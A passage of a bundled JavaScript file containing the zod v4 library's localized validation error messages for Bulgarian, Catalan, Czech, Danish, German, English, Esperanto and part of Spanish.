          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043D\u0438\u0437: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0432\u043A\u043B\u044E\u0447\u0432\u0430 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043D\u0438\u0437: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0441\u044A\u0432\u043F\u0430\u0434\u0430 \u0441 ${_issue.pattern}`;
        let invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D";
        if (_issue.format === "emoji")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u043E";
        if (_issue.format === "datetime")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u043E";
        if (_issue.format === "date")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u0430";
        if (_issue.format === "time")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u043E";
        if (_issue.format === "duration")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u0430";
        return `${invalid_adj} ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u043E \u0447\u0438\u0441\u043B\u043E: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0431\u044A\u0434\u0435 \u043A\u0440\u0430\u0442\u043D\u043E \u043D\u0430 ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0437\u043F\u043E\u0437\u043D\u0430\u0442${issue2.keys.length > 1 ? "\u0438" : ""} \u043A\u043B\u044E\u0447${issue2.keys.length > 1 ? "\u043E\u0432\u0435" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043A\u043B\u044E\u0447 \u0432 ${issue2.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434";
      case "invalid_element":
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u0430 \u0441\u0442\u043E\u0439\u043D\u043E\u0441\u0442 \u0432 ${issue2.origin}`;
      default:
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434`;
    }
  };
};
function bg_default() {
  return {
    localeError: error4()
  };
}
// node_modules/zod/v4/locales/ca.js
var error5 = () => {
  const Sizable = {
    string: { unit: "car\xE0cters", verb: "contenir" },
    file: { unit: "bytes", verb: "contenir" },
    array: { unit: "elements", verb: "contenir" },
    set: { unit: "elements", verb: "contenir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "entrada",
    email: "adre\xE7a electr\xF2nica",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data i hora ISO",
    date: "data ISO",
    time: "hora ISO",
    duration: "durada ISO",
    ipv4: "adre\xE7a IPv4",
    ipv6: "adre\xE7a IPv6",
    cidrv4: "rang IPv4",
    cidrv6: "rang IPv6",
    base64: "cadena codificada en base64",
    base64url: "cadena codificada en base64url",
    json_string: "cadena JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Tipus inv\xE0lid: s'esperava instanceof ${issue2.expected}, s'ha rebut ${received}`;
        }
        return `Tipus inv\xE0lid: s'esperava ${expected}, s'ha rebut ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Valor inv\xE0lid: s'esperava ${stringifyPrimitive(issue2.values[0])}`;
        return `Opci\xF3 inv\xE0lida: s'esperava una de ${joinValues(issue2.values, " o ")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "com a m\xE0xim" : "menys de";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Massa gran: s'esperava que ${issue2.origin ?? "el valor"} contingu\xE9s ${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `Massa gran: s'esperava que ${issue2.origin ?? "el valor"} fos ${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "com a m\xEDnim" : "m\xE9s de";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Massa petit: s'esperava que ${issue2.origin} contingu\xE9s ${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Massa petit: s'esperava que ${issue2.origin} fos ${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Format inv\xE0lid: ha de comen\xE7ar amb "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Format inv\xE0lid: ha d'acabar amb "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Format inv\xE0lid: ha d'incloure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Format inv\xE0lid: ha de coincidir amb el patr\xF3 ${_issue.pattern}`;
        return `Format inv\xE0lid per a ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE0lid: ha de ser m\xFAltiple de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Clau${issue2.keys.length > 1 ? "s" : ""} no reconeguda${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Clau inv\xE0lida a ${issue2.origin}`;
      case "invalid_union":
        return "Entrada inv\xE0lida";
      case "invalid_element":
        return `Element inv\xE0lid a ${issue2.origin}`;
      default:
        return `Entrada inv\xE0lida`;
    }
  };
};
function ca_default() {
  return {
    localeError: error5()
  };
}
// node_modules/zod/v4/locales/cs.js
var error6 = () => {
  const Sizable = {
    string: { unit: "znak\u016F", verb: "m\xEDt" },
    file: { unit: "bajt\u016F", verb: "m\xEDt" },
    array: { unit: "prvk\u016F", verb: "m\xEDt" },
    set: { unit: "prvk\u016F", verb: "m\xEDt" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "regul\xE1rn\xED v\xFDraz",
    email: "e-mailov\xE1 adresa",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "datum a \u010Das ve form\xE1tu ISO",
    date: "datum ve form\xE1tu ISO",
    time: "\u010Das ve form\xE1tu ISO",
    duration: "doba trv\xE1n\xED ISO",
    ipv4: "IPv4 adresa",
    ipv6: "IPv6 adresa",
    cidrv4: "rozsah IPv4",
    cidrv6: "rozsah IPv6",
    base64: "\u0159et\u011Bzec zak\xF3dovan\xFD ve form\xE1tu base64",
    base64url: "\u0159et\u011Bzec zak\xF3dovan\xFD ve form\xE1tu base64url",
    json_string: "\u0159et\u011Bzec ve form\xE1tu JSON",
    e164: "\u010D\xEDslo E.164",
    jwt: "JWT",
    template_literal: "vstup"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u010D\xEDslo",
    string: "\u0159et\u011Bzec",
    function: "funkce",
    array: "pole"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no instanceof ${issue2.expected}, obdr\u017Eeno ${received}`;
        }
        return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no ${expected}, obdr\u017Eeno ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no ${stringifyPrimitive(issue2.values[0])}`;
        return `Neplatn\xE1 mo\u017Enost: o\u010Dek\xE1v\xE1na jedna z hodnot ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Hodnota je p\u0159\xEDli\u0161 velk\xE1: ${issue2.origin ?? "hodnota"} mus\xED m\xEDt ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "prvk\u016F"}`;
        }
        return `Hodnota je p\u0159\xEDli\u0161 velk\xE1: ${issue2.origin ?? "hodnota"} mus\xED b\xFDt ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Hodnota je p\u0159\xEDli\u0161 mal\xE1: ${issue2.origin ?? "hodnota"} mus\xED m\xEDt ${adj}${issue2.minimum.toString()} ${sizing.unit ?? "prvk\u016F"}`;
        }
        return `Hodnota je p\u0159\xEDli\u0161 mal\xE1: ${issue2.origin ?? "hodnota"} mus\xED b\xFDt ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED za\u010D\xEDnat na "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED kon\u010Dit na "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED obsahovat "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED odpov\xEDdat vzoru ${_issue.pattern}`;
        return `Neplatn\xFD form\xE1t ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Neplatn\xE9 \u010D\xEDslo: mus\xED b\xFDt n\xE1sobkem ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Nezn\xE1m\xE9 kl\xED\u010De: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Neplatn\xFD kl\xED\u010D v ${issue2.origin}`;
      case "invalid_union":
        return "Neplatn\xFD vstup";
      case "invalid_element":
        return `Neplatn\xE1 hodnota v ${issue2.origin}`;
      default:
        return `Neplatn\xFD vstup`;
    }
  };
};
function cs_default() {
  return {
    localeError: error6()
  };
}
// node_modules/zod/v4/locales/da.js
var error7 = () => {
  const Sizable = {
    string: { unit: "tegn", verb: "havde" },
    file: { unit: "bytes", verb: "havde" },
    array: { unit: "elementer", verb: "indeholdt" },
    set: { unit: "elementer", verb: "indeholdt" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "e-mailadresse",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dato- og klokkesl\xE6t",
    date: "ISO-dato",
    time: "ISO-klokkesl\xE6t",
    duration: "ISO-varighed",
    ipv4: "IPv4-omr\xE5de",
    ipv6: "IPv6-omr\xE5de",
    cidrv4: "IPv4-spektrum",
    cidrv6: "IPv6-spektrum",
    base64: "base64-kodet streng",
    base64url: "base64url-kodet streng",
    json_string: "JSON-streng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    string: "streng",
    number: "tal",
    boolean: "boolean",
    array: "liste",
    object: "objekt",
    set: "s\xE6t",
    file: "fil"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ugyldigt input: forventede instanceof ${issue2.expected}, fik ${received}`;
        }
        return `Ugyldigt input: forventede ${expected}, fik ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ugyldig v\xE6rdi: forventede ${stringifyPrimitive(issue2.values[0])}`;
        return `Ugyldigt valg: forventede en af f\xF8lgende ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        if (sizing)
          return `For stor: forventede ${origin ?? "value"} ${sizing.verb} ${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "elementer"}`;
        return `For stor: forventede ${origin ?? "value"} havde ${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        if (sizing) {
          return `For lille: forventede ${origin} ${sizing.verb} ${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `For lille: forventede ${origin} havde ${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Ugyldig streng: skal starte med "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Ugyldig streng: skal ende med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ugyldig streng: skal indeholde "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ugyldig streng: skal matche m\xF8nsteret ${_issue.pattern}`;
        return `Ugyldig ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ugyldigt tal: skal v\xE6re deleligt med ${issue2.divisor}`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Ukendte n\xF8gler" : "Ukendt n\xF8gle"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ugyldig n\xF8gle i ${issue2.origin}`;
      case "invalid_union":
        return "Ugyldigt input: matcher ingen af de tilladte typer";
      case "invalid_element":
        return `Ugyldig v\xE6rdi i ${issue2.origin}`;
      default:
        return `Ugyldigt input`;
    }
  };
};
function da_default() {
  return {
    localeError: error7()
  };
}
// node_modules/zod/v4/locales/de.js
var error8 = () => {
  const Sizable = {
    string: { unit: "Zeichen", verb: "zu haben" },
    file: { unit: "Bytes", verb: "zu haben" },
    array: { unit: "Elemente", verb: "zu haben" },
    set: { unit: "Elemente", verb: "zu haben" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "Eingabe",
    email: "E-Mail-Adresse",
    url: "URL",
    emoji: "Emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-Datum und -Uhrzeit",
    date: "ISO-Datum",
    time: "ISO-Uhrzeit",
    duration: "ISO-Dauer",
    ipv4: "IPv4-Adresse",
    ipv6: "IPv6-Adresse",
    cidrv4: "IPv4-Bereich",
    cidrv6: "IPv6-Bereich",
    base64: "Base64-codierter String",
    base64url: "Base64-URL-codierter String",
    json_string: "JSON-String",
    e164: "E.164-Nummer",
    jwt: "JWT",
    template_literal: "Eingabe"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "Zahl",
    array: "Array"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ung\xFCltige Eingabe: erwartet instanceof ${issue2.expected}, erhalten ${received}`;
        }
        return `Ung\xFCltige Eingabe: erwartet ${expected}, erhalten ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ung\xFCltige Eingabe: erwartet ${stringifyPrimitive(issue2.values[0])}`;
        return `Ung\xFCltige Option: erwartet eine von ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Zu gro\xDF: erwartet, dass ${issue2.origin ?? "Wert"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "Elemente"} hat`;
        return `Zu gro\xDF: erwartet, dass ${issue2.origin ?? "Wert"} ${adj}${issue2.maximum.toString()} ist`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Zu klein: erwartet, dass ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit} hat`;
        }
        return `Zu klein: erwartet, dass ${issue2.origin} ${adj}${issue2.minimum.toString()} ist`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Ung\xFCltiger String: muss mit "${_issue.prefix}" beginnen`;
        if (_issue.format === "ends_with")
          return `Ung\xFCltiger String: muss mit "${_issue.suffix}" enden`;
        if (_issue.format === "includes")
          return `Ung\xFCltiger String: muss "${_issue.includes}" enthalten`;
        if (_issue.format === "regex")
          return `Ung\xFCltiger String: muss dem Muster ${_issue.pattern} entsprechen`;
        return `Ung\xFCltig: ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ung\xFCltige Zahl: muss ein Vielfaches von ${issue2.divisor} sein`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Unbekannte Schl\xFCssel" : "Unbekannter Schl\xFCssel"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ung\xFCltiger Schl\xFCssel in ${issue2.origin}`;
      case "invalid_union":
        return "Ung\xFCltige Eingabe";
      case "invalid_element":
        return `Ung\xFCltiger Wert in ${issue2.origin}`;
      default:
        return `Ung\xFCltige Eingabe`;
    }
  };
};
function de_default() {
  return {
    localeError: error8()
  };
}
// node_modules/zod/v4/locales/en.js
var error9 = () => {
  const Sizable = {
    string: { unit: "characters", verb: "to have" },
    file: { unit: "bytes", verb: "to have" },
    array: { unit: "items", verb: "to have" },
    set: { unit: "items", verb: "to have" },
    map: { unit: "entries", verb: "to have" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "email address",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datetime",
    date: "ISO date",
    time: "ISO time",
    duration: "ISO duration",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    mac: "MAC address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded string",
    base64url: "base64url-encoded string",
    json_string: "JSON string",
    e164: "E.164 number",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        return `Invalid input: expected ${expected}, received ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Invalid input: expected ${stringifyPrimitive(issue2.values[0])}`;
        return `Invalid option: expected one of ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Too big: expected ${issue2.origin ?? "value"} to have ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `Too big: expected ${issue2.origin ?? "value"} to be ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Too small: expected ${issue2.origin} to have ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Too small: expected ${issue2.origin} to be ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Invalid string: must start with "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Invalid string: must end with "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Invalid string: must include "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Invalid string: must match pattern ${_issue.pattern}`;
        return `Invalid ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Invalid number: must be a multiple of ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Unrecognized key${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Invalid key in ${issue2.origin}`;
      case "invalid_union":
        return "Invalid input";
      case "invalid_element":
        return `Invalid value in ${issue2.origin}`;
      default:
        return `Invalid input`;
    }
  };
};
function en_default() {
  return {
    localeError: error9()
  };
}
// node_modules/zod/v4/locales/eo.js
var error10 = () => {
  const Sizable = {
    string: { unit: "karaktrojn", verb: "havi" },
    file: { unit: "bajtojn", verb: "havi" },
    array: { unit: "elementojn", verb: "havi" },
    set: { unit: "elementojn", verb: "havi" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "enigo",
    email: "retadreso",
    url: "URL",
    emoji: "emo\u011Dio",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-datotempo",
    date: "ISO-dato",
    time: "ISO-tempo",
    duration: "ISO-da\u016Dro",
    ipv4: "IPv4-adreso",
    ipv6: "IPv6-adreso",
    cidrv4: "IPv4-rango",
    cidrv6: "IPv6-rango",
    base64: "64-ume kodita karaktraro",
    base64url: "URL-64-ume kodita karaktraro",
    json_string: "JSON-karaktraro",
    e164: "E.164-nombro",
    jwt: "JWT",
    template_literal: "enigo"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "nombro",
    array: "tabelo",
    null: "senvalora"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Nevalida enigo: atendi\u011Dis instanceof ${issue2.expected}, ricevi\u011Dis ${received}`;
        }
        return `Nevalida enigo: atendi\u011Dis ${expected}, ricevi\u011Dis ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Nevalida enigo: atendi\u011Dis ${stringifyPrimitive(issue2.values[0])}`;
        return `Nevalida opcio: atendi\u011Dis unu el ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Tro granda: atendi\u011Dis ke ${issue2.origin ?? "valoro"} havu ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementojn"}`;
        return `Tro granda: atendi\u011Dis ke ${issue2.origin ?? "valoro"} havu ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Tro malgranda: atendi\u011Dis ke ${issue2.origin} havu ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Tro malgranda: atendi\u011Dis ke ${issue2.origin} estu ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Nevalida karaktraro: devas komenci\u011Di per "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Nevalida karaktraro: devas fini\u011Di per "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Nevalida karaktraro: devas inkluzivi "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Nevalida karaktraro: devas kongrui kun la modelo ${_issue.pattern}`;
        return `Nevalida ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Nevalida nombro: devas esti oblo de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Nekonata${issue2.keys.length > 1 ? "j" : ""} \u015Dlosilo${issue2.keys.length > 1 ? "j" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Nevalida \u015Dlosilo en ${issue2.origin}`;
      case "invalid_union":
        return "Nevalida enigo";
      case "invalid_element":
        return `Nevalida valoro en ${issue2.origin}`;
      default:
        return `Nevalida enigo`;
    }
  };
};
function eo_default() {
  return {
    localeError: error10()
  };
}
// node_modules/zod/v4/locales/es.js
var error11 = () => {
  const Sizable = {
    string: { unit: "caracteres", verb: "tener" },
    file: { unit: "bytes", verb: "tener" },
    array: { unit: "elementos", verb: "tener" },
    set: { unit: "elementos", verb: "tener" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "entrada",
    email: "direcci\xF3n de correo electr\xF3nico",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "fecha y hora ISO",
    date: "fecha ISO",
    time: "hora ISO",
    duration: "duraci\xF3n ISO",
    ipv4: "direcci\xF3n IPv4",
    ipv6: "direcci\xF3n IPv6",
    cidrv4: "rango IPv4",
    cidrv6: "rango IPv6",
    base64: "cadena codificada en base64",
    base64url: "URL codificada en base64",
    json_string: "cadena JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  const TypeDictionary = {
    nan: "NaN",
    string: "texto",
    number: "n\xFAmero",
    boolean: "booleano",
    array: "arreglo",
    object: "objeto",
    set: "conjunto",
    file: "archivo",
    date: "fecha",
    bigint: "n\xFAmero grande",
    symbol: "s\xEDmbolo",
    undefined: "indefinido",
    null: "nulo",
    function: "funci\xF3n",
    map: "mapa",
    record: "registro",
    tuple: "tupla",
    enum: "enumeraci\xF3n",
    union: "uni\xF3n",
    literal: "literal",
    promise: "promesa",
    void: "vac\xEDo",
    never: "nunca",
    unknown: "desconocido",
    any: "cualquiera"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Entrada inv\xE1lida: se esperaba instanceof ${issue2.expected}, recibido ${received}`;
        }
        return `Entrada inv\xE1lida: se esperaba ${expected}, recibido ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Entrada inv\xE1lida: se esperaba ${stringifyPrimitive(issue2.values[0])}`;
        return `Opci\xF3n inv\xE1lida: se esperaba una de ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        if (sizing)
          return `Demasiado grande: se esperaba que ${origin ?? "valor"} tuviera ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementos"}`;
        return `Demasiado grande: se esperaba que ${origin ?? "valor"} fuera ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        if (sizing) {
          return `Demasiado peque\xF1o: se esperaba que ${origin} tuviera ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Demasiado peque\xF1o: se esperaba que ${origin} fuera ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Cadena inv\xE1lida: debe comenzar con "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Cadena inv\xE1lida: debe terminar en "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cadena inv\xE1lida: debe incluir "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cadena inv\xE1lida: debe coincidir con el patr\xF3n ${_issue.pattern}`;
        return `Inv\xE1lido ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE1lido: debe ser m\xFAltiplo de ${issue2.divisor}`;
      case "unrecognized_keys":
